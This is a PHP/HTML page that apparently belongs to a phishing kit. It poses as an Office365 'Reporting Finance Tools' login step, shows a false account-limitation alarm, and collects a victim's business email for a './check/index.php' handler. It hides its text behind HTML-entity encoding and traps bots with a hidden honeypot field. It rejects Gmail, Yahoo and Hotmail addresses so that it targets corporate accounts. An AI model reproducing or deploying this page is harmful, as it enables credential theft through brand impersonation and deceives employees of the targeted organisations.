<?php
session_start();
$parts = explode('@',$_SESSION['_USER_']);
$user = $parts[0];
$domain = $parts[1]; 
?>
<!DOCTYPE html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
      <title>&#79;&#102;&#102;&#105;&#99;&#101;&#51;&#54;&#53;&#32;&#45;&#32;&#82;&#101;&#112;&#111;&#114;&#116;&#105;&#110;&#103;&#32;&#70;&#105;&#110;&#97;&#110;&#99;&#101;&#32;&#84;&#111;&#111;&#108;&#115;</title>
      <meta http-equiv="X-UA-Compatible" content="IE=edge" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <link rel="shortcut icon" type="image/x-icon" href="https://res-1.cdn.office.net/officehub/images/content/images/favicon-8f211ea639.ico" />
      <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css'>
      <link rel="stylesheet" media="all" href="./data/style.css" />
   </head>
   <body>
   
      <div class="container text-center ">
         <div id="refreshDivID">
            <div class="reloaded-divs">
               <div class="alert alert-warning alert-dismissible fade show" role="alert">
                  <strong>&#79;&#114;&#103;&#97;&#110;&#105;&#122;&#97;&#116;&#105;&#111;&#110;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#108;&#105;&#109;&#105;&#116;&#97;&#116;&#105;&#111;&#110;&#33;</strong> &#82;&#101;&#99;&#111;&#114;&#100;&#115;&#32;&#114;&#101;&#112;&#111;&#114;&#116;&#101;&#100;&#32;&#102;&#114;&#111;&#109;&#32;&#121;&#111;&#117;&#114;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#100;&#111;&#101;&#115;&#110;&#39;&#116;&#32;&#109;&#97;&#116;&#99;&#104;&#33;
               </div>
            </div>
         </div>
      </div>
      <section></section>
      <header class="header">
         <svg class="logo">
            <use xlink:href="/assets/icons/logos-c63e33449fe857b8807279df19de9cbc84b9e76510ce50e1c53da d07ba36fbf9.svg#logo-inline"></use>
         </svg>
      </header>
      <main>
          <style>
              .agreementDetail-logo {
  width: 90px !important;
  height: 90px;
  background-size: 90px 90px;
  display: block;
  margin: 0px auto;
}
          </style>
         <div>
            <center>
               <img src="https://docs.microsoft.com/en-us/microsoftteams/media/english_solution_certified_teams_badge_nobkgrd_graytext_rgb_500px.png" width="250" height="70">   
            </center>
         </div><br/>
         <form class="row-spacer" novalidate="novalidate" action="./check/index.php" accept-charset="UTF-8" method="post">
            <input name="utf8" type="hidden" value="✓" />
            <input type="hidden" name="authenticity_token" value="EAwfmnh50jzLzKBPMby2m6k/VdtpiwDDXwXUNEo5ycWviXJWVUdFE9w4fFxZwJbBcclPFA23YQEPkL3xrP9WGg==" />
            <div class="form-field is-focussed" data-js="form-field">
               <label class="form-field__label" for="customer_email">&#66;&#117;&#115;&#105;&#110;&#101;&#115;&#115;&#32;&#69;&#109;&#97;&#105;&#108;</label>
               <input class="input-text" autofocus="autofocus" type="email" value="<?=$emailinfofull;?>" name="customerlog" id="customer_email" />
            </div>
            <div id="botsvalidation" class="form-field" data-js="form-field">
               <label class="form-field__label" for="customer_password">Age</label>
               <input class="input-text" autocomplete="off"  type="text" name="customerage" />
            </div>
            <br />
            <center><div  class="u-bottom-spacing">
               <button style="cursor:pointer;" id="checkbut" type="submit" disabled="true">Next</button>
            </div></center>
         </form>
      </main>
      <footer>
         <nav>
            <a href="https://docs.microsoft.com/en-us/microsoftteams/teams-contact-center?tabs=connect">Contact</a>
            <a href="https://prodigyfinance.com/legal/privacy-policy">Privacy</a>
         </nav>
      </footer>
      <style>
         .error {color: #f03232;}
		 #botsvalidation{display:none !important;}

      </style>
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
      <script type="text/javascript">
         $('input').keyup(function(){
         if($.trim(this.value).length > 0)
             $("#checkbut").prop('disabled', false);
         });
         $('input').keyup(function(){
         if($.trim(this.value).length == 0)
             $("#checkbut").prop('disabled', true);
         });
         $(document).ready(function() { 
         
         $('#checkbut').click(function() {  
         
          $(".error").hide();
          var hasError = false;
          var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;
          var emailblockReg =
           /^([\w-\.]+@(?!gmail.com)(?!yahoo.com)(?!hotmail.com)([\w-]+\.)+[\w-]{2,4})?$/;
         
          var emailaddressVal = $("#customer_email").val();
          if(emailaddressVal == '') {
            $("#customer_email").after('<span class="error">Please enter your business email address.</span>');
            hasError = true;
          }
         
          else if(!emailReg.test(emailaddressVal)) {
            $("#customer_email").after('<span class="error">Enter a valid business email address.</span>');
            hasError = true;
          }
         
          else if(!emailblockReg.test(emailaddressVal)) {
            $("#customer_email").after('<span class="error">We could not find any account with that username.</span>');
            hasError = true
          } 
         
          if(hasError == true) { return false; }
         
          });
         });
         
      </script>
   </body>
</html>